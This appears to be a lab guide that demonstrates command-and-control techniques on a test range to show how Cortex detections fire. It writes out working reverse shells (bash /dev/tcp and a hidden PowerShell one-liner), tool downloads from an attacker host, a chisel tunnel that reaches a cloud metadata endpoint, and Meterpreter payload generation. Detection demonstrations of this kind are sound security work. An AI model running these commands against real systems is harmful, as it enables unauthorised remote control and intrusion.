# Tactic: Command & Control

**MITRE:** TA0011 — Command and Control
**Purpose for this guide:** Demonstrate how attackers establish communication channels back to their infrastructure after gaining a foothold. Each technique here triggers Cortex detections that show customers the agent sees C2 traffic in real time.

**Range variables used in this guide**

| Variable | What it represents |
|---|---|
| `<WIN_CLIENT_IP>` | Windows 11 client IP |
| `<LINUX_IP>` | Ubuntu 24.04 target IP |
| `<KALI_IP>` | Kali attacker IP |
| `<PORT>` | Listener port (e.g. 4444) |

---

## Tool 1 — Python HTTP Server: File Staging

**What it does:** Attackers use Python's built-in HTTP server to host payloads, tools, and scripts for download by target hosts. This is the standard "pull" delivery mechanism — start a server on Kali, download from the target. It triggers Cortex's file transfer detections on the receiving end.

**MITRE:** T1105 — Ingress Tool Transfer
**Targets:** Kali (server side) · any target (download side)
**Demo time:** ✅ Fast (~10 seconds to start)

---

### Give it a try

**Step 1 — Start the HTTP server on Kali to serve the current directory**

```
python3 -m http.server 8080
```

**Step 2 — From the target, download a file (run on the target)**

For Linux target:
```
curl http://<KALI_IP>:8080/linpeas.sh -o /tmp/linpeas.sh
```

For Windows target:
```
certutil -urlcache -f http://<KALI_IP>:8080/winPEASx64.exe C:\Windows\Temp\wp.exe
```

**What to look for:** The Python server logs incoming GET requests. The file appears on the target.

---

📸 **Screenshot:** `screenshots/07-command-and-control/01-python-http-server.png`
*Show: Python HTTP server running with incoming GET requests logged*

**What Cortex sees**
> **Alert:** Python HTTP server started · File transfer from unusual IP using known tools
> **Severity:** Medium | **MITRE:** T1105

📸 **Screenshot:** `screenshots/07-command-and-control/01-python-http-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 2 — netcat: Reverse Shell

**What it does:** Netcat (nc) establishes a raw TCP connection. Attackers use it to create reverse shells — the target connects back to Kali, delivering an interactive shell through a plain TCP channel. One of the simplest C2 techniques; Cortex detects the netcat process and the raw TCP stream creation.

**MITRE:** T1059.004 — Command and Scripting Interpreter: Unix Shell · T1095 — Non-Application Layer Protocol
**Targets:** Linux (run listener on Kali, trigger from Linux target)
**Demo time:** ✅ Fast (~30 seconds total)

---

### Give it a try

**Step 1 — Start a listener on Kali (run this first, leave it running)**

```
nc -lvnp <PORT>
```

**Step 2 — Trigger the reverse shell from the Linux target** (run in your shell on the Linux host)

```
bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1
```

**What to look for:** The Kali listener receives the connection and shows a bash prompt from the target. Type `whoami` and `hostname` to confirm.

**Cleanup:** Type `exit` in the shell to close the connection.

---

📸 **Screenshot:** `screenshots/07-command-and-control/02-netcat-reverse-shell.png`
*Show: nc listener on Kali receiving connection, shell prompt from target*

**What Cortex sees**
> **Alert:** Netcat makes or gets connections · A TCP stream was created directly in a shell · Uncommon Linux remote shell command execution
> **Severity:** High | **MITRE:** T1059.004

📸 **Screenshot:** `screenshots/07-command-and-control/02-netcat-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 3 — chisel: HTTP Tunnel

**What it does:** Chisel creates a fast TCP tunnel over HTTP. Attackers use it to pivot through firewalls and proxy internal traffic through what looks like normal web traffic. `ligolo-proxy` on Kali acts as the server; `ligolo-agent` (or chisel client) deploys on the target.

**MITRE:** T1572 — Protocol Tunneling · T1090 — Proxy
**Targets:** Linux · Windows Client
**Demo time:** ⚠️ Moderate (~1 minute setup)

---

### Give it a try

**Step 1 — Start the chisel server on Kali**

```
chisel server --reverse --port 8888
```

**Step 2 — From the target, connect back and create a SOCKS proxy**

For Linux target:
```
chisel client <KALI_IP>:8888 R:socks
```

**Step 3 — Use the SOCKS proxy on Kali to route traffic through the target**

```
curl --socks5 127.0.0.1:1080 http://169.254.169.254/latest/meta-data/
```

**What to look for:** The chisel server shows an incoming connection. Traffic sent through the SOCKS proxy routes via the target host.

---

📸 **Screenshot:** `screenshots/07-command-and-control/03-chisel-tunnel.png`
*Show: chisel server and client connected, SOCKS proxy active*

**What Cortex sees**
> **Alert:** Uncommon reverse SSH tunnel to external domain/ip · Uncommon network connection under an untrusted causality actor
> **Severity:** High | **MITRE:** T1572

📸 **Screenshot:** `screenshots/07-command-and-control/03-chisel-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 4 — Metasploit / Meterpreter: Full C2 Framework *(Manual Capture)*

**What it does:** Metasploit's Meterpreter is a full-featured C2 agent — encrypted channel, file system access, process injection, pivoting, and more. This demonstrates what a professional C2 framework looks like vs. a raw netcat shell. Requires a listener, payload generation, and delivery — a multi-step process captured manually with tmux.

**MITRE:** T1071 — Application Layer Protocol · T1055 — Process Injection
**Targets:** Windows Client · Linux
**Demo time:** 🕐 Multi-step — manual capture recommended

---

### Give it a try

Capture this with a tmux split (two panes: handler + interaction).

**Step 1 — Start the Metasploit listener on Kali**

```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <KALI_IP>; set LPORT <PORT>; run"
```

**Step 2 — Generate a Windows payload**

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=<PORT> -f exe -o /tmp/demo.exe
```

**Step 3 — Deliver and execute on the Windows target** (via your existing shell), then interact with the session in Metasploit.

**What to look for:** A `meterpreter >` prompt on Kali once the target executes the payload.

---

📸 **Screenshot:** `screenshots/07-command-and-control/04-meterpreter.png`
*Show: Meterpreter session opened, sysinfo output*

**What Cortex sees**
> **Alert:** Abnormal process connection to default Meterpreter port · Globally uncommon high entropy process was executed
> **Severity:** High | **MITRE:** T1071

📸 **Screenshot:** `screenshots/07-command-and-control/04-meterpreter-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 5 — PowerShell Reverse Shell

**What it does:** A one-liner that creates a reverse shell using only built-in Windows PowerShell — no binaries to drop. Demonstrates that C2 is possible with nothing but what's already on the target, making it a high-value detection for Cortex's script engine monitoring.

**MITRE:** T1059.001 — Command and Scripting Interpreter: PowerShell
**Targets:** Windows Client · DC
**Demo time:** ✅ Fast (~30 seconds)

---

### Give it a try

**Step 1 — Start a listener on Kali**

```
nc -lvnp <PORT>
```

**Step 2 — Run the PowerShell reverse shell on the Windows target**

```
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<KALI_IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=$r+'PS> ';$rb=[Text.Encoding]::ASCII.GetBytes($rb);$s.Write($rb,0,$rb.Length)};"
```

**What to look for:** Kali's nc listener receives the shell. Commands typed in the nc terminal run on the Windows target.

---

📸 **Screenshot:** `screenshots/07-command-and-control/05-ps-reverse-shell.png`
*Show: Kali nc listener receiving the PowerShell reverse shell, commands running*

**What Cortex sees**
> **Alert:** Suspicious PowerShell Command Line · PowerShell suspicious flags · Script Engine Activity · A TCP stream was created directly in a shell
> **Severity:** High | **MITRE:** T1059.001

📸 **Screenshot:** `screenshots/07-command-and-control/05-ps-reverse-shell-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*
